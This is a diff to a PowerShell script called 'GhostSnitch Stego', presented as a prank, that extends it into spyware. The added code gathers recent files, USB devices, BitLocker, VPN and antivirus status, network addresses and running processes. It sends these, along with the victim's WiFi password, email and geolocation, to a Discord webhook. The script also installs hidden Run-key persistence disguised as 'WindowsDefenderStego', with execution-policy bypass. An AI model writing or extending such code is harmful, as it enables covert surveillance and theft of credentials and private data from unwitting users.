@@ -16,10 +16,19 @@ $s = New-Object -ComObject SAPI.SpVoice
 $s.Rate = -1
 
 function Get-GeoInfo {
-    try {
-        $r = (Invoke-WebRequest 'https://ipwho.is/' -UseBasicParsing -TimeoutSec 5).Content | ConvertFrom-Json
-        return "$($r.city), $($r.region), $($r.country)  |  ISP: $($r.connection.isp)"
-    } catch { return "Geolocation unavailable" }
+    $endpoints = @(
+        @{ url = 'https://ipwho.is/';         city = 'city'; region = 'region';     country = 'country';      isp = { $r.connection.isp } },
+        @{ url = 'https://ipapi.co/json/';    city = 'city'; region = 'region';     country = 'country_name'; isp = { $r.org } },
+        @{ url = 'https://ip-api.com/json/';  city = 'city'; region = 'regionName'; country = 'country';      isp = { $r.isp } }
+    )
+    foreach ($ep in $endpoints) {
+        try {
+            $r    = (Invoke-WebRequest $ep.url -UseBasicParsing -TimeoutSec 5).Content | ConvertFrom-Json
+            $city = $r.($ep.city); $region = $r.($ep.region); $country = $r.($ep.country); $isp = & $ep.isp
+            if ($city) { return "$city, $region, $country  |  ISP: $isp" }
+        } catch {}
+    }
+    return "Geolocation unavailable"
 }
 
 function Get-FullName {
@@ -28,6 +37,89 @@ function Get-FullName {
         if ([string]::IsNullOrWhiteSpace($n)) { $n = $env:username }
         return $n
     } catch { return $env:username }
+}
+
+function Get-UserInfo {
+    return "User: $env:USERNAME on $env:COMPUTERNAME"
+}
+
+function Get-OS {
+    return (Get-CimInstance Win32_OperatingSystem).Caption
+}
+
+function Get-Uptime {
+    $uptime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
+    $ts = New-TimeSpan -Start $uptime -End (Get-Date)
+    return "Uptime: $($ts.Days) days, $($ts.Hours) hours"
+}
+
+function Get-DriveStats {
+    $drives = Get-PSDrive -PSProvider FileSystem
+    return ($drives | ForEach-Object {
+        "$($_.Name): $([int]($_.Used/1GB))GB used / $([int]($_.Free/1GB))GB free"
+    }) -join "`n"
+}
+
+function Get-RecentFiles {
+    $recent = Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -ErrorAction SilentlyContinue |
+        Sort-Object LastWriteTime -Descending | Select-Object -First 5
+    return "Recent Files: " + (($recent | ForEach-Object { $_.Name }) -join ", ")
+}
+
+function Get-USB {
+    try { return (Get-PnpDevice -Class 'USB' -ErrorAction Stop).FriendlyName -join ", " }
+    catch { return "No USB info found" }
+}
+
+function Get-BitLocker {
+    try {
+        $status = Get-BitLockerVolume -ErrorAction Stop | Select-Object MountPoint, ProtectionStatus
+        return ($status | ForEach-Object { "$($_.MountPoint): $($_.ProtectionStatus)" }) -join ", "
+    } catch { return "BitLocker status unknown" }
+}
+
+function Get-VPNStatus {
+    try {
+        $vpnPattern = 'VPN|TAP-Win|WireGuard|OpenVPN|Cisco AnyConnect|GlobalProtect|NordVPN|ExpressVPN|Mullvad|ProtonVPN|Tailscale|ZeroTier'
+        $vpnAdapters = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.InterfaceDescription -match $vpnPattern }
+        $builtIn = Get-VpnConnection -ErrorAction SilentlyContinue | Where-Object { $_.ConnectionStatus -eq 'Connected' }
+        $found = @()
+        if ($vpnAdapters) { $found += $vpnAdapters | ForEach-Object { $_.InterfaceDescription } }
+        if ($builtIn)     { $found += $builtIn     | ForEach-Object { $_.Name } }
+        if ($found) { return "Active: " + ($found -join ", ") }
+        return "No VPN detected"
+    } catch { return "Unknown" }
+}
+
+function Get-NetworkInfo {
+    try {
+        $excludePattern = 'VPN|TAP|TUN|WireGuard|OpenVPN|Cisco|GlobalProtect|NordVPN|ExpressVPN|Mullvad|ProtonVPN|Tailscale|ZeroTier|Hyper-V|Virtual|vEthernet|Loopback|Bluetooth|6to4|ISATAP|Teredo'
+        $adapter = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.InterfaceDescription -notmatch $excludePattern } |
+                   Select-Object -First 1
+        if (-not $adapter) { $adapter = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Select-Object -First 1 }
+        $ip = (Get-NetIPAddress -InterfaceIndex $adapter.InterfaceIndex -AddressFamily IPv4 -ErrorAction SilentlyContinue |
+               Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -ne '127.0.0.1' } |
+               Select-Object -First 1).IPAddress
+        return "Local IP: $ip, MAC: $($adapter.MacAddress)"
+    } catch {
+        $ip  = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
+                Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -ne '127.0.0.1' } |
+                Select-Object -First 1).IPAddress
+        $mac = (Get-NetAdapter | Where-Object Status -eq 'Up' | Select-Object -First 1).MacAddress
+        return "Local IP: $ip, MAC: $mac"
+    }
+}
+
+function Get-Antivirus {
+    try {
+        $av = Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName AntivirusProduct -ErrorAction Stop
+        return ($av.displayName) -join ", "
+    } catch { return "No antivirus info found" }
+}
+
+function Get-TopProcesses {
+    $procs = Get-Process | Sort-Object WorkingSet -Descending | Select-Object -First 5
+    return ($procs | ForEach-Object { "$($_.ProcessName): $([math]::Round($_.WorkingSet/1MB,1))MB" }) -join ", "
 }
 
 function Get-RAM {
@@ -41,10 +133,13 @@ function Get-RAM {
 }
 
 function Get-PubIP {
-    try {
-        $IP = (Invoke-WebRequest 'https://ipinfo.io/ip' -UseBasicParsing -TimeoutSec 5).Content.Trim()
-        return "Your public IP is $IP. Say hi to the world for me."
-    } catch { return "Couldn't fetch your public IP. You're a ghost already." }
+    foreach ($url in @('https://ipinfo.io/ip', 'https://api.ipify.org', 'https://icanhazip.com')) {
+        try {
+            $IP = (Invoke-WebRequest $url -UseBasicParsing -TimeoutSec 5).Content.Trim()
+            if ($IP -match '^\d+\.\d+\.\d+\.\d+$') { return "Your public IP is $IP. Say hi to the world for me." }
+        } catch {}
+    }
+    return "Couldn't fetch your public IP. You're a ghost already."
 }
 
 function Get-WifiPass {
@@ -130,13 +225,24 @@ function Make-StegoWallpaper {
 }
 
 # ---- Collect all data once --------------------------------------------------
-$fullName  = Get-FullName
-$ramRoast  = Get-RAM
-$pubIP     = Get-PubIP
-$wifiRoast = Get-WifiPass
-$passAge   = Get-PasswordAge
+$fullName   = Get-FullName
+$ramRoast   = Get-RAM
+$pubIP      = Get-PubIP
+$wifiRoast  = Get-WifiPass
+$passAge    = Get-PasswordAge
 $emailRoast = Get-Email
 $geo        = Get-GeoInfo
+$userInfo   = Get-UserInfo
+$osInfo     = Get-OS
+$uptime     = Get-Uptime
+$drives     = Get-DriveStats
+$recent     = Get-RecentFiles
+$usb        = Get-USB
+$bitlocker  = Get-BitLocker
+$network    = Get-NetworkInfo
+$vpnStatus  = Get-VPNStatus
+$av         = Get-Antivirus
+$procs      = Get-TopProcesses
 
 # ---- Send report to Discord -------------------------------------------------
 if ($webhookUrl -ne 'REPLACE_ME') {
@@ -150,21 +256,37 @@ if ($webhookUrl -ne 'REPLACE_ME') {
                 @{ name = "Prank ID";      value = $prankId;    inline = $true  },
                 @{ name = "Target";        value = $targetAlias; inline = $true  },
                 @{ name = "Location";      value = $geo;        inline = $false },
+                @{ name = "User Info";     value = $userInfo;   inline = $true  },
+                @{ name = "Email Roast";   value = $emailRoast; inline = $false },
+                @{ name = "OS";            value = $osInfo;     inline = $true  },
+                @{ name = "Uptime";        value = $uptime;     inline = $true  },
+                @{ name = "Drives";        value = $drives;     inline = $false },
+                @{ name = "Recent Files";  value = $recent;     inline = $false },
+                @{ name = "USB Devices";   value = $usb;        inline = $false },
+                @{ name = "BitLocker";     value = $bitlocker;  inline = $true  },
+                @{ name = "Network";       value = $network;    inline = $true  },
+                @{ name = "VPN";           value = $vpnStatus;  inline = $true  },
+                @{ name = "Antivirus";     value = $av;         inline = $false },
+                @{ name = "Top Processes"; value = $procs;      inline = $false },
                 @{ name = "RAM Roast";     value = $ramRoast;   inline = $true  },
                 @{ name = "Public IP";     value = $pubIP;      inline = $true  },
                 @{ name = "WiFi Password"; value = $wifiRoast;  inline = $false },
-                @{ name = "Password Age";  value = $passAge;    inline = $false },
-                @{ name = "Email Roast";   value = $emailRoast; inline = $false }
+                @{ name = "Password Age";  value = $passAge;    inline = $false }
             )
             footer    = @{ text = "GhostSnitch Stego v1.1 by TBJr" }
             timestamp = (Get-Date).ToString("o")
         })
     }
-    try {
-        Invoke-RestMethod -Uri $webhookUrl -Method Post `
-            -Body (ConvertTo-Json $payload -Depth 10) `
-            -ContentType 'application/json' -ErrorAction Stop
-    } catch {}
+    for ($attempt = 1; $attempt -le 3; $attempt++) {
+        try {
+            Invoke-RestMethod -Uri $webhookUrl -Method Post `
+                -Body (ConvertTo-Json $payload -Depth 10) `
+                -ContentType 'application/json' -ErrorAction Stop
+            break
+        } catch {
+            if ($attempt -lt 3) { Start-Sleep -Seconds 3 }
+        }
+    }
 }
 
 # ---- Wait for mouse movement ------------------------------------------------
@@ -194,5 +316,7 @@ if ($MyInvocation.MyCommand.Path) {
 } else {
     $MyInvocation.MyCommand.ScriptBlock.ToString() | Out-File -FilePath $dest -Encoding UTF8 -Force
 }
-schtasks /create /f /sc onlogon /tn "WindowsDefenderStego" `
-    /tr "powershell -w h -NoP -NonI -Ep Bypass -File `"$dest`"" 2>$null | Out-Null
+Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
+    -Name 'WindowsDefenderStego' `
+    -Value "powershell -w h -NoP -NonI -Ep Bypass -File `"$dest`"" `
+    -Force -ErrorAction SilentlyContinue
